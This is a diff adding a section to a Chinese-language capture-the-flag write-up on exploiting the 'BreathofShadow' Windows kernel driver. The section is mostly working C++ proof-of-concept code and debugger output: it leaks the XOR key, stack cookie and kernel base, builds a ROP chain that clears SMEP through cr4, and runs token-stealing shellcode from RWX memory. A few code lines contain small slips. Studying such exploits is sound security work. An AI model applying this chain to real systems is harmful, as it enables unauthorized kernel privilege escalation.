@@ -1032,6 +1032,8 @@ NTSTATUS EncryptionFunction(PIRP pIrp, PIO_STACK_LOCATION CurrentIoStackLocation
 我們首先使用 Windows API 寫一個腳本和 BreathofShadow 驅動程序正常溝通  (C++)
 
 ```c++
+#define WIN32_LEAN_AND_MEAN
+
 #include <windows.h>
 #include <cstdint>
 #include <cstdio>
@@ -1116,10 +1118,176 @@ kd> g
 ```
 RDX 指向的資料 (核心中的 Buffer) 中有 XOR 後的資料，這將會被拷貝到使用者傳入的 Buffer中，而 R8 是我們透過 DeviceIoControl 傳入的 OutputSize 256。
 
+理解它的套路以後就可以來寫 POC 了，首先我們來抓 XOR Key，可以先傳入一個值，再將 XOR 回傳的結果與原值做 XOR，這樣就能得到 XOR Key: 
 
+```c++
+uintptr_t xor_key = 0x4141414141414141;
+DeviceIoControl(hDevice, IOCTL_ENCRYPT, &xor_key, 8, NULL, 8, &outSize, NULL);
+xor_key ^= 0x4141414141414141;
+printf("Encryption key: 0x%llx\n");
+```
 
+```
+Encryption key: 0x22811cec`76d10f87
+```
+確認一下:
+```
+kd> dq BreathofShadow+3018 L1
+fffff800`1fad3018  22811cec`76d10f87
+```
 
+接下來，我們要看一下我們的資料寫入核心前後時的堆疊布局，再進行 ROP。
+* **複製前**
 
+```
+Breakpoint 0 hit
+BreathofShadow+0x506f:
+fffff800`1fad506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
+kd> dq rcx L35
+ffff950a`a6efb690  00000000`00000000 00000000`00000000
+ffff950a`a6efb6a0  00000000`00000000 00000000`00000000
+[...]
+ffff950a`a6efb780  00000000`00000000 00000000`00000000
+ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
+ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
+ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
+ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
+ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
+ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
+ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
+ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
+ffff950a`a6efb810  00000000`00000000 00000000`00000001
+ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
+ffff950a`a6efb830  00000000`00000001
+```
+* **複製後**
+```
+kd> p
+BreathofShadow+0x5074:
+fffff800`1fad5074 8bcb            mov     ecx,ebx
+kd> dq rcx L35
+ffff950a`a6efb690  41414141`41414141 41414141`41414141
+ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
+[...]
+ffff950a`a6efb780  41414141`41414141 41414141`41414141
+ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
+ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
+ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
+ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
+ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
+ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
+ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
+ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
+ffff950a`a6efb810  00000000`00000000 00000000`00000001
+ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
+ffff950a`a6efb830  00000000`00000001
+```
+使用```k``` 來查看 backtrace，並尋找 return address 在哪裡。
+```
+kd> k
+Child-SP          RetAddr           Call Site
+ffff950a`a6efb660 fffff800`1fad518a BreathofShadow+0x5074
+ffff950a`a6efb7c0 fffff800`08e35cf5 BreathofShadow+0x518a
+ffff950a`a6efb7f0 fffff800`092452ac nt!IofCallDriver+0x55
+[...]
+kd> s -q ffff950a`a6efb690 L100 BreathofShadow+0x518a
+ffff950a`a6efb7b8  fffff800`1fad518a ffff9681`e12fa950
+```
 
+所以，return address 就在 0xffff950a\`a6efb7b8，計算一下相對於 InputBuffer 的偏移量 0xffff950a\`a6efb7b8 -  ffff950a\`a6efb690 = 0x128 = 296。所以，如果我們傳入296個 bytes 的資料再加上一段位址，函式回傳時就會嘗試執行那段位址的資料。但是，這裡的堆疊有 stack cookie，這是一個隨機值。函數執行結束時，程式會檢查堆疊中的 stack cookie 值是否改變。如果 stack cookie 被改動（通常是因為緩衝區溢位篡改了它），程式會發現這一點並停止執行，避免繼續執行被破壞的程式碼，這代表我們必須要洩漏這個值才有可能做 ROP。
+
+要洩漏 stack cookie 也很簡單，我們只需要把 InputSize 調很小然後 OutputSize 調很大，它就會讀到 Buffer 以外的資料了，為了方便，我們先把 Buffer 後面的值全部讀一讀，然後寫入 ROP 時把除了 return address 的值回復就可以了接下來的步驟就和一般 ROP 一樣了:
+
+```
+char stack_dump[560];
+DeviceIoControl(hDevice, IOCTL_ENCRYPT, stack_dump, 1, NULL, 560, &outSize, NULL);
+hexdump(stack_dump+256, 48);
+
+//把它轉換成 qword 方便以後使用
+uintptr_t* stack_ptrs = (uintptr_t*)stack_dump;
+```
+
+接下來要關掉 SMEP 和 SMAP。要找這兩個 ROP Gadget:
+```
+pop rcx; ret
+mov cr4, rcx; ret
+```
+我們可以到 ntoskrnl.exe (``C:\Windows\System32\ntoskrnl.exe``) 中找，因為很多 Kernel Driver 的堆疊上都有指向 ntoskrnl.exe 資料的指標，我們的也不例外:
+
+```
+kd> p
+BreathofShadow+0x5074:
+fffff800`1fad5074 8bcb            mov     ecx,ebx
+kd> dq rcx L35
+ffff950a`a6efb690  41414141`41414141 41414141`41414141
+ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
+[...]
+ffff950a`a6efb780  41414141`41414141 41414141`41414141
+ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
+ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
+ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
+ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
+ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
+ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
+ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
+ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
+ffff950a`a6efb810  00000000`00000000 00000000`00000001
+ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
+ffff950a`a6efb830  00000000`00000001
+
+kd> lm m nt
+start             end                 module name
+fffff800`08c00000 fffff800`09c46000   nt         (pdb symbols)          C:\ProgramData\dbg\sym\ntkrnlmp.pdb\D9424FC4861E47C10FAD1B35DEC6DCC81\ntkrnlmp.pdb
+```
+
+在 ffff950a\`a6efb790 上，有一個指標 fffff800\`0961a301 在 ntoskrnl (nt) 的記憶體範圍內，並且指向 ntoskrnl.exe + 0xA1A301 (偏移值不同版本的機器可能會不太一樣) 所以我們只需要從 stack_dump 中抓這個指標然後扣掉 0xA1A301 就可以得到 ```ntoskrnl.exe``` 的基底，也就是 kernel base 了。
+
+```c++
+uintptr_t kernel_base = stack_ptrs[33] - 0xA1A301;
+printf("Nt module base at 0x%llx\n", kernel_base);
+```
+
+最後是兩個 ROP Gadget 的偏移 :
+
+pop rcx; ret -> ntoskrnl.exe + 0x2148c8
+
+mov cr4, rcx -> ntoskrnl.exe + 0x3A0A87
+
+開始寫 payload 前，記得傳入的位址資料要先與 XOR Key 做 XOR，否則原本的值會被改變:
+```c++
+#define ADDR(x) ((x) ^ xor_key)
+```
+建構 Payload:
+```c++
+uintptr_t payload[74] {};
+for(int i = 36; i >= 31; i--){
+    payload[i] = ADDR(stack_ptrs[i]);
+}
+
+payload[37] = ADDR(kernel_base + 0x2148c8); //pop rcx, ret
+payload[38] = ADDR(0x50ef0);
+payload[39] = ADDR(kernel_base + 0x3A0A87); //mov cr4, rcx; ret
+```
+然後把之前得那支提權 shellcode 組譯，這裡推薦 [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly) ，它有支援 C 字串格式的組譯輸出，很方便。
+然後把組譯結果放到 POC 中，並且把第 54 和 55 個位元組換成目前的程序的 PID (使用 GetCurrentProcessId)
+```c++
+char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4c\x8B\x8a\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x24\xF0\x48\x8B\x51\xF8\x48\x81\xFA\x00\x00\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xC3";
+```
+接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡。(原題解中只有 RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)
+
+```c++
+DWORD pid = GetCurrentProcessId();
+
+shellcode[54] = (char)pid;
+shellcode[55] = (char)(pid >> 8);
+
+PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+memcpy(shellcode_addr, shellcode, sizeof(shellcode));
+
+printf("Shellcode at 0x%llx\n", (uintptr_t)shellcode);
+payload[40] = ADDR((uintptr_t)shellcode_addr);
+
+DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(payload), &outSize, NULL); //Send our payload!
+```
 
 
